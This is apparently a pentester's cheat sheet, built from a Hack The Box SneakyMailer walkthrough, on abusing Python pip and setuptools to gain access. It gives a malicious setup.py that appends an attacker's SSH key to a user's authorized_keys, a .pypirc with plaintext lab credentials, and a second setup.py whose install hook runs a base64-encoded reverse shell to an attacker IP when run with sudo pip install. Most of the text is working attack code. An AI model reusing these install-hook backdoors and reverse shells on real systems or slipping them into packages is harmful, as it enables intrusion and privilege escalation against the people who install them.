Python PIP Exploit (sdist)

http://insec.in/2020/07/15/hack-the-box-sneakymailer-walkthrough/

First go to tmp and create a package directory

cd /tmp
mkdir mypkg

Then create .pypirc file

[distutils]
index-servers = local

[local]
repository: http://pypi.sneakycorp.htb:8080
username: pypi
password: soufianeelhaoui

Create a key, which can then add to authorized keys

root@kali:~/hackthebox/machine/SneakyMailer# ssh-keygen -b 2048 -t ed25519 -f ./key -q -N ''

root@kali:~/hackthebox/machine/SneakyMailer# cat key.pub

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMM20bpCOUwHR4+8hMegW7FanYYPdA6yJZ1OIniwUDXn root@kali

Create the file “setup.py”

#!/usr/bin/python

# -*- coding: utf-8 -*-

import setuptools

try:
    with open('/home/low/.ssh/authorized_keys', 'a') as f:

        f.write('\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINWLOep+t1bm+GS0lGVtI6YIHS5sqKWKoulvUxV9PcZU greg@kali')

        f.close()

except Exception as e:
    pass
    setuptools.setup(  # Replace with your own username
        name='example-pkg3',
        version='0.0.1',
        author='Example Author',
        author_email='author@example.com',
        description='A small example package',
        long_description='',
        long_description_content_type='text/markdown',
        url='https://github.com/pypa/sampleproject',
        packages=setuptools.find_packages(),
        classifiers=['Programming Language :: Python :: 3',
                    'License :: OSI Approved :: MIT License',
                    'Operating System :: OS Independent'],
        )

Upload the setup.py and .pypirc to the target (wget, scp etc...)

Change the permissions for these files

chmod 777 setup.py
chmod 600 .pypirc

Change the HOME environment variable

HOME=$(pwd)

Execute setup.py with PIP (sdists)
https://docs.python.org/2/distutils/sourcedist.html

python3 setup.py sdist register -r local upload -r local

* * *

# **PIP exploit without sdist**

https://github.com/0x00-0x00/FakePip

The reverse shell is embeded inside the setup.py.

Create a setup.py file and upload it on the target.

from setuptools import setup
from setuptools.command.install import install
import base64
import os

class CustomInstall(install):
  def run(self):
    install.run(self)
    LHOST = '10.10.14.29'  # change this
    LPORT = 8888 #change this

    reverse_shell = 'python -c "import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"'.format(LHOST=LHOST,LPORT=LPORT)

    encoded = base64.b64encode(reverse_shell.encode())
    os.system('echo %s|base64 -d|bash' % encoded.decode())

setup(name='FakePip',
      version='0.0.1',
      description='This will exploit a sudoer able to /usr/bin/pip install *',
      url='https://github.com/0x00-0x00/fakepip',
      author='zc00l',
      author_email='andre.marques@esecurity.com.br',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})

Then run PIP

(sudo) pip install .

OR

(sudo) pip install . --upgrade --force-reinstall